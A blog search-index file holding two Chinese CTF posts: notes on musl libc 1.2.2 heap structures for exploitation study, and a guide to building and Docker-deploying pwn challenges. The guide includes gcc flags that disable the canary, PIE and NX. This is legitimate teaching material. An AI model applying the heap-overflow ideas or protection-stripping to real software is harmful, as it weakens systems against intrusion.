<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>musl_libc_pwn学习</title>
      <link href="/2025/07/25/musl-libc-pwn%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/07/25/musl-libc-pwn%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="musl-libc学习（1-2-2）"><a href="#musl-libc学习（1-2-2）" class="headerlink" title="musl_libc学习（1.2.2）"></a>musl_libc学习（1.2.2）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>1.1.xx的版本已经很老了，估计也不会遇到了，所以这里就不再学习了<del>主要是因为本人太懒了</del>，目前musl-libc已经出到了1.2.5-3了，但是貌似能搜到的题只有1.2.2的，所以学习一下1.2.2的堆管理结构，以及如何利用</p><p>(文章内容为个人简介，有错误的话欢迎大佬批评指出)</p><h2 id="环境布置"><a href="#环境布置" class="headerlink" title="环境布置"></a>环境布置</h2><p>musl-libc是集libc和ld为一体的，所以只要一个libc.so就够了，要调试musl的题，调试符号是必不可少的，但是从其他大佬的博客来看，都是要下载调试符号包，然后加载，本人鼓捣了半天，结果还是加载不出调试符号(可能是操作有误)，ubuntu要下载各个版本的调试符号包以及各种包的话可以去官网，<a href="https://launchpad.net/ubuntu/+source/musl">这里放个链接</a></p><h3 id="加载调试符号"><a href="#加载调试符号" class="headerlink" title="加载调试符号"></a>加载调试符号</h3><p>因为实在加载不出符号调试表，所以直接在源码编译的时候加了调试符号，直接使用带有调试符号的libc.so</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/桌面/musl</span><br><span class="line">wget https://musl.libc.org/releases/musl-1.2.2.tar.gz <span class="comment">#下载源码安装包</span></span><br><span class="line">tar -zxvf musl-1.2.2.tar.gz <span class="comment">#解压</span></span><br><span class="line"><span class="built_in">cd</span> musl-1.2.2</span><br><span class="line">./configure CFLAGS=<span class="string">&quot;-g -O0&quot;</span> --prefix=/usr/local/musl-1.2.2 <span class="comment"># 配置编译参数，启用调试符号（-g）并禁用优化（-O0），并指定了安装路径/usr/local/musl-1.2.2 ，可自行修改</span></span><br><span class="line">make -j4 <span class="comment"># 编译（-j4 表示使用4线程加速）</span></span><br><span class="line"><span class="built_in">sudo</span> make install <span class="comment"># 安装到指定目录，也就是上面的/usr/local/musl-1.2.2</span></span><br></pre></td></tr></table></figure><p>之后可以在path to/musl-1.2.2/lib下找到libc.so文件，此文件是加载了调试符号的</p><h3 id="muslheap插件"><a href="#muslheap插件" class="headerlink" title="muslheap插件"></a>muslheap插件</h3><p>安利<strong>xf1les</strong> 师傅编写的musl heap gdb 插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/xf1les/muslheap.git</span><br></pre></td></tr></table></figure><p>安装方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source /path/to/muslheap.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>具体使用方法以及环境要求在read.me文件里有，这里不再赘述，安装好之后就可以使用mheap等调试musl很方便的指令了</p><h3 id="patchelf换libc"><a href="#patchelf换libc" class="headerlink" title="patchelf换libc"></a>patchelf换libc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter /path to your/libc.so ./pwn <span class="comment">#将要调试的文件使用的libc更换为上述增加了调试符号的libc.so</span></span><br></pre></td></tr></table></figure><h3 id="编译使用musl的程序"><a href="#编译使用musl的程序" class="headerlink" title="编译使用musl的程序"></a>编译使用musl的程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/path to your/musl-1.2.2/bin/musl-gcc -g test.c -o <span class="built_in">test</span></span><br><span class="line">patchelf --set-interpreter /path to your/libc.so ./test <span class="comment">#你编译出来的elf还是会使用本地的libc.so，记得换成你加载了调试符号的libc.so</span></span><br></pre></td></tr></table></figure><p>编译musl程序，需要用到musl-gcc，上述加载调试符号时编译的源码里就有，因为版本是1.2.2的，所以编译出来的文件也是1.2.2的如果要编译其他版本的elf的话，和上述操作类似，下载一份其他版本的源码，编译好之后用配套的musl-gcc编译即可</p><h2 id="堆管理结构学习"><a href="#堆管理结构学习" class="headerlink" title="堆管理结构学习"></a>堆管理结构学习</h2><p>musl的堆管理结构和glibc的区别还是挺大的，musl的堆管理结构没有bins，而是通过meta管理group，group管理chunk来实现的，其中__malloc_context又记录着meta的情况，网上很多博客关于此结构已经写的很清楚了，这里主要写一下我自己的见解，放几个链接大家可以参考一下</p><p><a href="[[原创\]musl 1.2.2 总结+源码分析 One-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-269533-1.htm">链接1</a>)</p><p><a href="[从musl libc 1.1.24到1.2.2 学习pwn姿势-安全KER - 安全资讯平台](https://www.anquanke.com/post/id/253566">链接2</a>)</p><p><a href="[musl基础知识整理 - 星盟安全团队](https://blog.xmcve.com/2022/08/08/musl基础知识整理/#title-8">链接3</a>)</p><h3 id="malloc-context"><a href="#malloc-context" class="headerlink" title="__malloc_context"></a>__malloc_context</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">   <span class="type">uint64_t</span> secret;<span class="comment">// 和meta_area 头的check 是同一个值 就是校验值</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">   <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">   <span class="type">int</span> init_done;<span class="comment">//是否初始化标记</span></span><br><span class="line">   <span class="type">unsigned</span> mmap_counter;<span class="comment">// 记录有多少mmap 的内存的数量</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// 被free 的meta 头 这里meta 管理使用了队列和双向循环链表</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//指向可用meta数组</span></span><br><span class="line">   <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// 记录着可用的meta</span></span><br><span class="line">   <span class="type">size_t</span> u sage_by_class[<span class="number">48</span>];</span><br><span class="line">   <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">   <span class="type">uint8_t</span> seq;</span><br><span class="line">   <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-25%20150108.png" alt="屏幕截图 2025-07-25 150108"></p><p>1.active数组中储存着不同大小的meta，分别在对应的位置，如管理大小为0x30chunk的meta在active[2]，这些meta通过双向循环链表连接 来</p><p>2.avail_meta表示剩余的可用的meta数量，上图为87，如果我没有malloc 0x40大小的chunk的话，上图就不会有active[3]，那么avail_meta的数量应该是88</p><p>3.free_meta表示已经释放的meta数量，这里为0</p><h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span>   <span class="comment">//双向链表</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span>          <span class="comment">// 这里指向管理的group 地址</span></span><br><span class="line">   <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">   <span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">   <span class="type">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">   <span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">   <span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-25%20150931.png" alt="屏幕截图 2025-07-25 150931"></p><p>1.prev和next分别指向此meta的上一个meta和下一个meta，通过此结构双向链表的结构连接起来</p><p>2.mem记录着此meta对应的group的地址在哪</p><p>3.last_idx的数字意味着这个meta最多可以管理几个chunk，[0~last_idx]，上图所示的话也就是10个</p><p>4.freeable代表这个meta可不可以被释放，1为可以</p><p>5.sizeclass代表这个meta管理的chunk的大小，此图是2，和上图的active[2]是对应的，也就是管理的0x30大小的chunk</p><p>6.avail_mask和freed_mask都要转变成二进制看：</p><p>512的二进制是0b1000000000,意味着我已经申请了9个chunk（对应0）只剩最后一个chunk没有申请了</p><p>20的二进制是0b10100，意味着编号为2，4的chunk被free掉了</p><h3 id="group"><a href="#group" class="headerlink" title="group"></a>group</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span>   </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">// meta的地址</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">   <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];<span class="comment">// 保证0x10字节对齐</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">char</span> storage[];<span class="meta"># chunk</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-25%20151945.png" alt="屏幕截图 2025-07-25 151945"></p><p>group的前8字节记录着此group对应的meta的地址，active_idx，也就是9，记录着此group管理的chunk的数量</p><p>至于pad，还没明白是用来干什么的，有知道的可以佬可以说一下</p><p>接着就是chunk里的内容了如图0x6161这些是chunk里的内容</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"> <span class="type">char</span> prev_user_data[];</span><br><span class="line">   <span class="type">uint8_t</span> idx;        <span class="comment">//低5bit为idx第几个chunk</span></span><br><span class="line">   <span class="type">uint16_t</span> offset;    <span class="comment">//与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！</span></span><br><span class="line">   <span class="type">char</span> data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-25%20152455.png" alt="屏幕截图 2025-07-25 152455"></p><p>如0x6538f4fa2ca8的0x0003a1000000000d</p><p>其中0003是对应着offset</p><p>而a1是chunk的idx</p><p>这个程序是我自己编写用来调试的，申请的第一个chunk的idx就是a0，估计是前面的chunk的idx是程序初始化使用了吧</p><p>而最后的d,目前没有找到大佬介绍，我自己试着调试了一下，这个值和申请的chunk的大小有关</p><p>可以看到上图中的那个位置有d有0有c，位置为d的那个chunk我是malloc(0x1f)得到的，而c的chunk我是malloc(0x20)得到的，如果malloc(0x28)及以上的话，那个位置就是0了，也就是说，这个地方的数字对应着这个chunk还可以再大多少，比如d的那个地方，说明我malloc(0x1f+0xd)，也会使用这个chunk,c的位置便是malloc(0x20+0xc)，而当malloc(0x29)时，已经覆盖了这个位置，所以就变成0了，也就是说我malloc(0x1d~0x2c)得到的chunk的大小是一样的</p><p>类似于glibc中物理相邻的上一个chunk可以使用下一个chunk的psize位，musl中的上一个chunk可以使用下一个chunk的12个字节（也可以说是4个字节，看你怎么理解吧）对应于0x0003a1000000000d，我可以溢出写成0x0003a100061616161，</p><p>chunk可以通过记录的offset找到group，比如位于0xa0的chunk的offset是3，0xa0-3*0x10=0x70，就找到了group，而group又可以通过记录的meta地址找到meta，以此来管理堆结构</p><h2 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h2><p>正在努力ing…</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> musl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn出题</title>
      <link href="/2025/07/21/pwn%E5%87%BA%E9%A2%98/"/>
      <url>/2025/07/21/pwn%E5%87%BA%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="编写程序代码"><a href="#编写程序代码" class="headerlink" title="编写程序代码"></a>编写程序代码</h2><p>写好程序代码之后C语言(或者其他)，编译成二进制可执行程序</p><p>如果只是编译的话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc your_file_name.c -o target_name</span><br></pre></td></tr></table></figure><p>去除canary</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector your_file_name.c -o target_name </span><br></pre></td></tr></table></figure><p>去除pie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie your_file_name.c -o target_name </span><br></pre></td></tr></table></figure><p>去除NX</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack  your_file_name.c -o target_name </span><br></pre></td></tr></table></figure><h2 id="ctf-xinted部署"><a href="#ctf-xinted部署" class="headerlink" title="ctf_xinted部署"></a>ctf_xinted部署</h2><h3 id="本地："><a href="#本地：" class="headerlink" title="本地："></a>本地：</h3><ol><li><p>在bin文件夹中放入要运行的二进制程序，flag内容自定</p></li><li><p>ctf_xinetd</p><p>将./your_file替换为你的文件名，这里建议将port（容器内的端口）改为80，<del>虽然不知道为什么，但貌似这样更快一点</del></p></li></ol>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 9999 #容器内的端口</span><br><span class="line">    bind        = 0.0.0.0 #本地IP</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    # replace helloworld to your program</span><br><span class="line">    server_args = --userspec=1000:1000 /home/ctf ./your_file #!!!</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    # safety options</span><br><span class="line">    per_source= 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu= 20 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    #rlimit_as  = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>Dockerfile<br>如果要拉取ubuntu18.0以下的版本的话在注释的地方需要改一下，按原代码写</p><p>要是上面改了容器端口的话，记得把下面的暴露端口也改掉  “EXPOSE 9999  #容器对外暴露的端口”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:24.04   #拉取镜像版本</span><br><span class="line"></span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /usr/lib* /home/ctf  #这个地方和原文件有点不同，需要修改一下，原文件的写法只适合拉去ubuntu18.0以下的版本</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag</span><br><span class="line"></span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 9999  #容器对外暴露的端口可能会用到的命令</span><br></pre></td></tr></table></figure></li><li><p>可能用到的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker build  -t <span class="string">&quot;pwn&quot;</span> .#用当前目录下的Dockerfile文件创建名为pwn的镜像</span><br><span class="line">docker run -d -p <span class="string">&quot;0.0.0.0:1234:9999&quot;</span> -h <span class="string">&quot;pwn&quot;</span> --name=<span class="string">&quot;pwn&quot;</span> pwn#将本地的1234端口映射到容器中的9999端口，并给容器内的主机起名为pwn，同时将这个容器也命名为pwn，方便管理，之后通过nc 0.0.0.0 1234就可以成功了</span><br><span class="line">docker ps <span class="comment">#可以查看目前有哪些容器</span></span><br><span class="line">docker stop 容器名/ID <span class="comment">#停止容器</span></span><br><span class="line">docker <span class="built_in">rm</span> 容器名/ID <span class="comment">#删除容器</span></span><br><span class="line">docker rmi 镜像名#删除镜像</span><br><span class="line">docker images#查看有哪些镜像</span><br><span class="line">docker <span class="built_in">exec</span> -it  容器名/ID /bin/bash <span class="comment">#进入容器</span></span><br></pre></td></tr></table></figure></li><li><p>start.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">sleep</span> infinity;</span><br></pre></td></tr></table></figure></li></ol><h3 id="GZ平台部署-动态flag"><a href="#GZ平台部署-动态flag" class="headerlink" title="GZ平台部署(动态flag)"></a>GZ平台部署(动态flag)</h3><ol><li><p>在部署动态flag的时候我把start.sh改为了flag.sh,对应的Dockerfile里的内容也要修改</p></li><li><p>ctf_xinted</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 80</span><br><span class="line">    bind        = 0.0.0.0</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    # replace helloworld to your program</span><br><span class="line">    server_args = --userspec=1001:1001 /home/ctf ./your_file</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    # safety options</span><br><span class="line">    per_source= 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu= 20 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    #rlimit_as  = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Dockerfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:24.04</span><br><span class="line"></span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./flag.sh /flag.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /flag.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag</span><br><span class="line"></span><br><span class="line">CMD [&quot;/flag.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>flag.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$GZCTF_FLAG</span> &gt; /home/ctf/flag</span><br><span class="line"><span class="comment"># 清除环境变量</span></span><br><span class="line"><span class="built_in">unset</span> GZCTF_FLAG</span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">sleep</span> infinity;</span><br></pre></td></tr></table></figure></li><li><p>之后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build  -t <span class="string">&quot;pwn&quot;</span> .#创建镜像</span><br></pre></td></tr></table></figure></li><li><p>将镜像push到github仓库里</p><ol><li><p>现在github里弄一个Personal access tokens``Tokens(classic)，方便写入</p></li><li><p>bash命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> your_token | docker login ghcr.io --username your_id --password-stdin <span class="comment">#your_id 为你的github的用户名</span></span><br><span class="line">docker tag name_of_package ghcr.io/your_id/app:latest <span class="comment"># name_of_package为本地已经存在的镜像 app为你将要上传到仓库的名称 latest为标签</span></span><br><span class="line">docker push ghcr.io/your_id/app:latest <span class="comment">#成功push</span></span><br></pre></td></tr></table></figure><p>完成之后便可以在github里看到push进来的镜像了</p><p><img 